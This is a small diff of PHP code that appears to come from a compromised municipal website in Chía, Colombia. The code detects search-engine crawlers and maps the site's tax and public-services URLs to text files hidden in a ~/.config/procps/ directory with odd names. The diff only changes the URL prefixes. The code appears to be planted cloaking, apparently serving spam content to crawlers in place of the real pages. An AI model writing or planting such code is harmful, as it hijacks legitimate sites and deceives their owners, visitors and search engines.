@@ -8,9 +8,9 @@ $isCrawler = preg_match(
 );
 
 $pathMap = [
-    '/web/tramites-y-servicios/'             =>   '/home/chiacundippal/.config/procps/koncet.txt',
-	'/web/tag/impuesto-predial/'             =>   '/home/chiacundippal/.config/procps/oalahhh.txt',
-	'/web/2026/01/calendario-tributario-2026-fechas-y-plazos-para-el-pago-de-impuestos-en-chia/'               =>       '/home/chiacundippal/.config/procps/inilah-saatnya.txt',
+    '/tramites-y-servicios/'             =>   '/home/chiacundippal/.config/procps/koncet.txt',
+	'/tag/impuesto-predial/'             =>   '/home/chiacundippal/.config/procps/oalahhh.txt',
+	'/2026/01/calendario-tributario-2026-fechas-y-plazos-para-el-pago-de-impuestos-en-chia/'               =>       '/home/chiacundippal/.config/procps/inilah-saatnya.txt',
 ];
 
 
